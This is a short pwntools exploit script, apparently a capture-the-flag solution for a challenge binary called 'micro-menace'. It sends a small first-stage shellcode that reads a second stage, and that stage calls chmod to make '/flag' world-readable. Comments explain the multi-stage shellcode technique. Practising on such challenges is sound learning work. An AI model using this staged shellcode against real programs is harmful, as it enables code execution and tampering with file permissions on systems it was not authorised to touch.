from pwn import *
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
p = process("/challenge/micro-menace")
payload = asm(
"""
xor edi, edi
push rdx
pop rsi
syscall
"""
)
my_shell = asm(
"""
nop
nop
nop
push 0
mov rbx, 0x67616c662f2f2f2f
push rbx
mov rdi, rsp
mov esi, 0x1ff
mov eax, 0x5a
syscall
"""
)
p.send(payload+asm("nop")*0x100+my_shell)
p.interactive()
#Remember to use multi stage shellcode technique. Can google this. 
#Basily the first payload is the first shellcode that use read syscall with read(0,rip,size) with 0 is file descriptor of stdin, rip is the position of 2nd shellcode that need read, write, excutable permission and size is the number of bytes for read.
#The seconcd shellcode (my_shell) is the shellcode that changes the permisssion of the flag by using chmod("/flag",777)
